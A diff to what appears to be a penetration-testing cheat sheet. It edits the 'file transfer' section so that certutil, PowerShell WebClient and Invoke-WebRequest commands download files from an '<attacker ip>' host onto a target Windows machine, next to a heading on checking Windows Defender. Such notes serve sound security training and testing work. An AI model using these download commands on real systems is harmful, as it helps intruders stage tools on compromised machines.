@@ -45,8 +45,9 @@ file transfer
 
 ```cmd
 # on target 
-certutil -urlcache -split -f "http://<target ip>/<file>" "C:\Users\<User Account>\Desktop\<file>"
+certutil -urlcache -split -f "http://<attacker ip>/<file>" "C:\Users\<User Account>\Desktop\<file>"
 PowerShell -c "(new-object System.Net.WebClient).DownloadFile('http://<attacker ip>/<file>', '<file>')"
+Powershell Invoke-WebRequest -OutFile C:\Users\<User Account>\Desktop\<file> -Uri http://<attacker ip>/<file>
 ```
 
 checking if Windows Defender is active
